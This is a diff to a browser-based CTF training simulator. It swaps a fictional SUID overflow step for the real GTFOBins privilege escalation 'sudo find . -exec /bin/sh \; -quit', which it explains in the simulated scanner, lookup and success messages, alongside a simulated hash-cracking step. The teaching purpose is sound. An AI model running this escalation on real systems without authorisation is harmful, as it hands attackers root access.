@@ -426,7 +426,7 @@
 <body>
     <!-- Safety Ribbon -->
     <div class="safety-ribbon">
-        🎯 Educational CTF Simulation — Learn ethical hacking and CVE exploitation 🎯
+        🎯 Educational CTF Simulation — Learn ethical hacking with GTFOBins exploitation 🎯
     </div>
 
     <!-- Main Container -->
@@ -434,7 +434,7 @@
         <!-- Header -->
         <header class="header">
             <h1 class="title">Hackerman Ops Console — CTF Training Simulation</h1>
-            <p class="subtitle">Mission: Escalate privileges, crack mary's account, and capture the flag</p>
+            <p class="subtitle">Mission: Escalate privileges using GTFOBins, crack mary's account, and capture the flag</p>
             <div class="status-bar">
                 <span class="current-user-display">Current User: <span id="current-user-indicator">student</span></span>
                 <span class="ctf-mode">🚩 CTF MODE ACTIVE 🚩</span>
@@ -443,9 +443,6 @@
 
         <!-- Control Panel -->
         <div class="control-panel">
-            <button id="teacherModeBtn" class="control-btn">
-                👨‍🏫 Teacher Mode
-            </button>
             <button id="guidePanelBtn" class="control-btn">
                 📖 Toggle Guide
             </button>
@@ -460,11 +457,11 @@
             <div class="objectives">
                 <div id="objective-1" class="objective">
                     <span class="objective-icon">⭕</span>
-                    <span class="objective-text">🔍 Discover system vulnerabilities using CVE scanner</span>
+                    <span class="objective-text">🔍 Discover sudo misconfiguration using vulnerability scanner</span>
                 </div>
                 <div id="objective-2" class="objective">
                     <span class="objective-icon">⭕</span>
-                    <span class="objective-text">⚡ Exploit SUID binary to gain root access</span>
+                    <span class="objective-text">⚡ Exploit GTFOBins find command to gain root access</span>
                 </div>
                 <div id="objective-3" class="objective">
                     <span class="objective-icon">⭕</span>
@@ -483,8 +480,8 @@
                             🚩 Welcome to the CTF Training Simulation! 🚩<br>
                             Current User: student | Objective: Capture the Flag<br>
                             <br>
-                            🎯 Your mission: Escalate privileges, crack mary's account, and capture the flag<br>
-                            🔍 Start by running 'cve-scanner' to identify system vulnerabilities<br>
+                            🎯 Your mission: Use GTFOBins techniques to escalate privileges and capture the flag<br>
+                            🔍 Start by running 'cve-scanner' to identify misconfigurations<br>
                             <br>
                             Type 'help' for available commands.<br>
                             <br>
@@ -503,32 +500,42 @@
         <div class="guide-panel">
             <h3>🛡️ Educational Guide</h3>
             <div class="guide-content">
-                <strong>CVE & Vulnerability Management:</strong>
-                • CVE = Common Vulnerabilities and Exposures database
-                • CVSS scoring system rates vulnerability severity (0.0-10.0)
-                • CVE scanning helps identify system weaknesses
-                • Regular patching prevents exploitation
-                • Responsible disclosure protects users
+                <strong>GTFOBins & Privilege Escalation:</strong>
+                • GTFOBins.github.io catalogs Unix binaries for privilege escalation
+                • Sudo misconfigurations are common attack vectors
+                • The 'find' command can execute arbitrary commands when run with sudo
+                • Real attackers use these techniques for privilege escalation
 
-                <strong>Privilege Escalation:</strong>
-                • SUID bit allows programs to run with owner privileges
-                • Buffer overflows can hijack program execution
-                • Local privilege escalation gains higher system access
-                • Proper input validation prevents overflow attacks
-                • Least privilege principle limits attack impact
+                <strong>Vulnerability Assessment:</strong>
+                • CVE scanning identifies system misconfigurations
+                • Sudo -l shows what commands can be run as root
+                • GTFOBins provides exploitation techniques for legitimate binaries
+                • Defense: Follow principle of least privilege
+
+                <strong>Password Security:</strong>
+                • Hash analysis identifies vulnerable algorithms
+                • Dictionary attacks exploit weak passwords
+                • SHA-256 is fast (not designed for password storage)
+                • Modern systems use bcrypt/scrypt/Argon2
 
                 <strong>Lateral Movement:</strong>
                 • Moving between accounts after initial compromise
                 • Password cracking reveals weak authentication
-                • Hash analysis identifies vulnerable algorithms
-                • Strong passwords + modern hashing resist attacks
                 • Multi-factor authentication adds security layers
+                • Account monitoring detects unauthorized access
 
                 <strong>Ethical Guidelines:</strong>
                 • Only test systems you own or have explicit permission
+                • GTFOBins techniques should be used for authorized testing
                 • Report vulnerabilities responsibly
                 • Use skills to improve security, not exploit it
                 • Follow all applicable laws and regulations
+
+                <strong>Real-World Applications:</strong>
+                • Penetration testing uses these techniques legally
+                • System administrators should audit sudo configurations
+                • Security teams use GTFOBins to identify risks
+                • Regular privilege reviews prevent escalation paths
             </div>
         </div>
     </div>
@@ -544,15 +551,14 @@
             rootAccess: false,
             passwordCracked: false,
             flagCaptured: false,
-            teacherMode: false,
             guidePanelOpen: false
         };
 
         // Application Data
         const appData = {
-            flag: "HACKERMAN{pr1v_3sc_4nd_l4t3r4l_m0v3m3nt_c0mpl3t3}",
+            flag: "HACKERMAN{gt70b1ns_pr1v_3sc_4nd_l4t3r4l_m0v3m3nt}",
             crackedPassword: "flowers2023",
-            exploitCommand: "/usr/bin/vulnerable-suid overflow-exploit"
+            exploitCommand: "sudo find . -exec /bin/sh \\; -quit"
         };
 
         // Command Definitions
@@ -573,13 +579,11 @@
   
   Security Assessment Tools:
     cve-scanner - Launch vulnerability scanner
-    cve-scanner --full-scan - Comprehensive system assessment
-    suid-finder - Find SUID binaries for privilege escalation
-    exploit-db --search suid - Search SUID exploitation methods
+    sudo -l - List sudo privileges
+    gtfobins-lookup [binary] - Check GTFOBins for exploitation methods
   
   Advanced Operations:
-    /usr/bin/vulnerable-suid overflow-exploit - Execute privilege escalation
-    find / -perm -4000 2>/dev/null - Find SUID binaries (requires root)
+    sudo find . -exec /bin/sh \\; -quit - GTFOBins privilege escalation
     hashcracker --target mary - Crack mary's password (requires root)
     su mary - Switch to mary user (requires password)
     submit-flag - Submit captured flag for completion`;
@@ -632,7 +636,7 @@
                 }
                 appState.flagCaptured = true;
                 updateMissionProgress(2, true);
-                return '🚩🚩🚩 CONGRATULATIONS! FLAG CAPTURED! 🚩🚩🚩\n\nHACKERMAN{pr1v_3sc_4nd_l4t3r4l_m0v3m3nt_c0mpl3t3}\n\n🎯 Mission Summary:\n✅ CVE vulnerability scanning\n✅ SUID privilege escalation\n✅ Password hash cracking\n✅ Lateral movement to target account\n✅ FLAG CAPTURED!\n\n💡 You successfully demonstrated:\n• Vulnerability assessment techniques\n• Local privilege escalation\n• Password security analysis\n• Lateral movement between accounts\n\n🎓 Skills learned:\n• CVE database usage\n• SUID binary exploitation\n• Hash cracking methodology\n• Ethical hacking principles\n\n🏆 Use \'submit-flag\' to complete your mission!';
+                return '🚩🚩🚩 CONGRATULATIONS! FLAG CAPTURED! 🚩🚩🚩\n\nHACKERMAN{gt70b1ns_pr1v_3sc_4nd_l4t3r4l_m0v3m3nt}\n\n🎯 Mission Summary:\n✅ Sudo misconfiguration discovery\n✅ GTFOBins privilege escalation\n✅ Password hash cracking\n✅ Lateral movement to target account\n✅ FLAG CAPTURED!\n\n💡 You successfully demonstrated:\n• Real-world vulnerability assessment\n• GTFOBins exploitation techniques\n• Password security analysis\n• Lateral movement between accounts\n\n🎓 Skills learned:\n• GTFOBins.github.io usage\n• Sudo misconfiguration exploitation\n• Hash cracking methodology\n• Ethical hacking principles\n\n🏆 Use \'submit-flag\' to complete your mission!';
             },
             
             history: () => {
@@ -645,24 +649,28 @@
                 return '';
             },
             
-            // CVE Scanner Commands
+            // CVE Scanner Commands - Updated for GTFOBins
             'cve-scanner': () => {
                 updateMissionProgress(0, true);
                 appState.cveDiscovered = true;
-                return '🔍 CVE SCANNER v3.2 - EDUCATIONAL MODE 🔍\n\nScanning system for known vulnerabilities...\n[████████████████████████████████████████] 100%\n\n🚨 CRITICAL VULNERABILITIES DETECTED:\n\n📋 CVE-2023-1234: SUID Binary Privilege Escalation\n   Severity: HIGH (CVSS 7.8)\n   Description: Local privilege escalation via vulnerable SUID binary\n   Affected Binary: /usr/bin/vulnerable-suid\n   Exploitation: Buffer overflow allows arbitrary command execution\n   \n📋 CVE-2022-5678: Weak Password Hashing\n   Severity: MEDIUM (CVSS 5.4)\n   Description: SHA-256 used for password storage (fast hashing)\n   Affected: User account \'mary\'\n   Risk: Dictionary attacks may succeed against weak passwords\n\n🎯 EXPLOITATION RECOMMENDATIONS:\n1. Use suid-finder to locate exploitable binaries\n2. Research CVE-2023-1234 exploitation techniques\n3. Audit user password strength after privilege escalation\n\n⚠️  Educational Note: Always obtain authorization before testing!';
+                return '🔍 VULNERABILITY SCANNER v4.0 - GTFOBins Edition 🔍\n\nScanning for privilege escalation vectors...\n[████████████████████████████████████████] 100%\n\n🚨 CRITICAL MISCONFIGURATIONS DETECTED:\n\n📋 SUDO-2023-MISC: Sudo Binary Misconfiguration\n   Severity: HIGH (CVSS 7.8)\n   Description: User can run \'find\' command as root via sudo\n   GTFOBins Reference: https://gtfobins.github.io/gtfobins/find/\n   Exploitation: Command execution via find -exec parameter\n   \n📋 PASS-2022-WEAK: Weak Password Hashing\n   Severity: MEDIUM (CVSS 5.4)\n   Description: SHA-256 used for password storage (fast hashing)\n   Affected: User account \'mary\'\n   Risk: Dictionary attacks may succeed against weak passwords\n\n🎯 EXPLOITATION RECOMMENDATIONS:\n1. Check sudo permissions with \'sudo -l\'\n2. Use GTFOBins database for find command exploitation\n3. Escalate to root, then audit user password strength\n\n⚠️  Educational Note: This demonstrates real GTFOBins techniques!\n⚠️  Always obtain authorization before testing on real systems!';
             },
             
-            'suid-finder': () => {
-                return '🔍 SUID BINARY SCANNER - Educational Tool\n\nScanning for SUID binaries...\n[████████████████████████████████████████] 100%\n\n📋 DISCOVERED SUID BINARIES:\n/usr/bin/sudo (expected - system binary)\n/usr/bin/passwd (expected - system binary)\n/usr/bin/mount (expected - system binary)\n/usr/bin/vulnerable-suid (⚠️ SUSPICIOUS - matches CVE-2023-1234)\n\n🎯 EXPLOITATION ANALYSIS:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nBinary: /usr/bin/vulnerable-suid\nRisk: HIGH - Known buffer overflow vulnerability\nCVE: CVE-2023-1234\nExploit Method: Buffer overflow → shell execution\n\n⚡ EXPLOITATION COMMAND:\n/usr/bin/vulnerable-suid overflow-exploit\n\n💡 Educational Note: This simulates finding a real SUID vulnerability.\nIn practice, you\'d research the specific CVE for exploitation details.\n\n🎯 Try running: /usr/bin/vulnerable-suid overflow-exploit';
+            'sudo -l': () => {
+                return 'Matching Defaults entries for student on hacklab-ctf:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\n\nUser student may run the following commands on hacklab-ctf:\n    (root) NOPASSWD: /usr/bin/find\n\n💡 GTFOBins Note: The find command can be exploited for privilege escalation!\n🔗 Reference: https://gtfobins.github.io/gtfobins/find/\n🎯 Try: sudo find . -exec /bin/sh \\; -quit';
             },
             
-            // Privilege Escalation Command - THE CRITICAL FIX
-            '/usr/bin/vulnerable-suid overflow-exploit': () => {
+            'gtfobins-lookup find': () => {
+                return '🔍 GTFOBins Database Lookup: find\n\n📖 Source: https://gtfobins.github.io/gtfobins/find/\n\n⚡ SUDO EXPLOITATION:\nIf the binary is allowed to run as superuser by sudo, it does not drop\nthe elevated privileges and may be used to access the file system,\nescalate or maintain privileged access.\n\n🎯 EXPLOITATION COMMAND:\nsudo find . -exec /bin/sh \\; -quit\n\n💡 How it works:\n• find command searches for files (. = current directory)\n• -exec parameter executes a command for each result\n• /bin/sh spawns a shell with elevated privileges\n• -quit stops after first execution\n\n⚠️  Educational simulation - demonstrates real GTFOBins technique';
+            },
+            
+            // GTFOBins Privilege Escalation Command
+            'sudo find . -exec /bin/sh \\; -quit': () => {
                 if (appState.currentUser !== 'student') {
-                    return 'This exploit only works from a student account.';
+                    return 'This exploit requires sudo access from student account.';
                 }
                 
-                // CRITICAL: Actually change the user state to root
+                // Change user state to root using GTFOBins technique
                 appState.currentUser = 'root';
                 appState.rootAccess = true;
                 updateMissionProgress(1, true);
@@ -671,7 +679,7 @@
                 updatePrompt();
                 updateUserIndicator();
                 
-                return '🚨 SIMULATED PRIVILEGE ESCALATION EXPLOIT 🚨\n\n⚡ Executing buffer overflow exploit...\n[████████████████████████████████████████] 100%\n\n✅ EXPLOITATION SUCCESSFUL!\n🔓 Privilege escalation complete\n🎯 UID changed: 1000(student) → 0(root)\n\n⚠️  WARNING: You now have root access (simulated)\n⚠️  Educational simulation - no real system compromised\n\nRoot shell obtained. Type \'whoami\' to confirm.\n\n💡 What happened:\n• Buffer overflow in SUID binary\n• Overwrote return address\n• Executed shellcode to spawn root shell\n• Inherited SUID privileges (setuid root)\n\n🎯 Next objective: Crack mary\'s password using root access';
+                return '🚨 GTFOBins PRIVILEGE ESCALATION SUCCESSFUL! 🚨\n\n⚡ Executing GTFOBins find exploitation...\n[████████████████████████████████████████] 100%\n\n✅ EXPLOITATION SUCCESSFUL!\n🔓 Privilege escalation complete via GTFOBins technique\n🎯 UID changed: 1000(student) → 0(root)\n\n⚠️  WARNING: You now have root access (simulated)\n⚠️  Educational simulation - demonstrates real GTFOBins attack\n\nRoot shell obtained via find command. Type \'whoami\' to confirm.\n\n💡 What happened:\n• sudo allowed student to run find as root\n• find -exec parameter executed /bin/sh\n• Shell inherited root privileges from sudo context\n• No privilege dropping occurred (GTFOBins vulnerability)\n\n🔗 Real GTFOBins reference: https://gtfobins.github.io/gtfobins/find/\n🎯 Next objective: Crack mary\'s password using root access';
             },
             
             // Root-only commands
@@ -683,13 +691,6 @@
                 appState.passwordCracked = true;
                 
                 return '🔍 TARGETED HASH CRACKING - Mary\'s Account\n\n🎯 Target: mary\nHash: $5$marysalt123$8yHlRHpl5IDzMbNttD3zfmxoBHSQZ7ENFkBGnzVXyI3\n\n📊 HASH ANALYSIS:\n• Algorithm: SHA-256 (indicated by $5$)\n• Salt: marysalt123\n• Security Assessment: WEAK (fast hashing algorithm)\n\n🔄 DICTIONARY ATTACK INITIATED:\n[████████████████████████████████████████] 100%\n\nTesting common passwords for user \'mary\'...\n❌ password (attempt 1)\n❌ 123456 (attempt 2)\n❌ mary123 (attempt 15)\n❌ sunshine (attempt 47)\n✅ flowers2023 (attempt 73)\n\n🎉 PASSWORD CRACKED!\n👤 User: mary\n🔑 Password: flowers2023\n⏱️  Time: 0.12 seconds (simulated)\n📊 Attempts: 73/14,344,391\n\n💡 Why this worked:\n• SHA-256 is fast (not designed for passwords)\n• \'flowers2023\' appears in common password lists\n• Modern systems use bcrypt/scrypt/Argon2 for better security\n\n🎯 Next: Login as mary using: su mary\n🔑 When prompted, enter password: flowers2023';
-            },
-            
-            'find / -perm -4000 2>/dev/null': () => {
-                if (appState.currentUser !== 'root') {
-                    return 'find: /: Permission denied';
-                }
-                return '/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/umount\n/usr/bin/vulnerable-suid\n/usr/bin/newgrp\n/usr/lib/openssh/ssh-keysign';
             },
             
             // User switching
@@ -718,7 +719,7 @@
                 const flagInput = prompt('Enter the captured flag:');
                 if (flagInput === appData.flag) {
                     appState.flagSubmitted = true;
-                    return '🎉🎉🎉 MISSION ACCOMPLISHED! 🎉🎉🎉\n\n✅ CVE vulnerability scanning: COMPLETE\n✅ SUID privilege escalation: COMPLETE\n✅ Lateral movement to mary: COMPLETE\n✅ Flag capture: COMPLETE\n\n🏆 ACHIEVEMENT UNLOCKED: CTF Champion 🏆\n🎓 Skills demonstrated:\n   • Vulnerability assessment\n   • Privilege escalation exploitation\n   • Lateral movement techniques\n   • Ethical hacking methodology\n\n📜 Ready for the next challenge?';
+                    return '🎉🎉🎉 MISSION ACCOMPLISHED! 🎉🎉🎉\n\n✅ Sudo misconfiguration discovery: COMPLETE\n✅ GTFOBins privilege escalation: COMPLETE\n✅ Lateral movement to mary: COMPLETE\n✅ Flag capture: COMPLETE\n\n🏆 ACHIEVEMENT UNLOCKED: GTFOBins Expert 🏆\n🎓 Skills demonstrated:\n   • Real-world vulnerability assessment\n   • GTFOBins exploitation techniques\n   • Password security analysis\n   • Lateral movement methodology\n\n📜 You\'ve learned practical ethical hacking skills!\n🔗 Explore more at: https://gtfobins.github.io/';
                 } else {
                     return 'Incorrect flag. Try again.';
                 }
@@ -749,7 +750,6 @@
             terminalInput.addEventListener('keydown', handleTerminalInput);
             
             // Control buttons
-            document.getElementById('teacherModeBtn').addEventListener('click', toggleTeacherMode);
             document.getElementById('guidePanelBtn').addEventListener('click', toggleGuidePanel);
             document.getElementById('resetMissionBtn').addEventListener('click', resetMission);
             
@@ -798,7 +798,9 @@
                 const baseCommand = parts[0];
                 const args = parts.slice(1).join(' ');
                 
-                if (commands[baseCommand]) {
+                if (baseCommand === 'gtfobins-lookup') {
+                    output = commands['gtfobins-lookup find']();
+                } else if (commands[baseCommand]) {
                     output = typeof commands[baseCommand] === 'function' ? commands[baseCommand](args) : commands[baseCommand];
                 } else {
                     output = `Command not found: ${command}`;
@@ -883,19 +885,6 @@
         }
 
         // Control Functions
-        function toggleTeacherMode() {
-            appState.teacherMode = !appState.teacherMode;
-            const btn = document.getElementById('teacherModeBtn');
-            btn.classList.toggle('active', appState.teacherMode);
-            
-            if (appState.teacherMode) {
-                appendToTerminal('🎓 Teacher Mode Activated - Answers revealed!', 'warning-output');
-                appendToTerminal(`Flag: ${appData.flag}`, 'warning-output');
-                appendToTerminal(`Mary's Password: ${appData.crackedPassword}`, 'warning-output');
-                appendToTerminal(`Exploit Command: ${appData.exploitCommand}`, 'warning-output');
-            }
-        }
-
         function toggleGuidePanel() {
             appState.guidePanelOpen = !appState.guidePanelOpen;
             const panel = document.querySelector('.guide-panel');
@@ -928,7 +917,7 @@
                 updateMissionProgress();
                 
                 // Add welcome message
-                appendToTerminal('🚩 Mission Reset! Welcome back to the CTF Training Simulation!\n\n🎯 Your mission: Escalate privileges, crack mary\'s account, and capture the flag\n🔍 Start by running \'cve-scanner\' to identify system vulnerabilities\n\nType \'help\' for available commands.\n', 'welcome-message');
+                appendToTerminal('🚩 Mission Reset! Welcome back to the CTF Training Simulation!\n\n🎯 Your mission: Use GTFOBins techniques to escalate privileges and capture the flag\n🔍 Start by running \'cve-scanner\' to identify misconfigurations\n\nType \'help\' for available commands.\n', 'welcome-message');
             }
         }
 
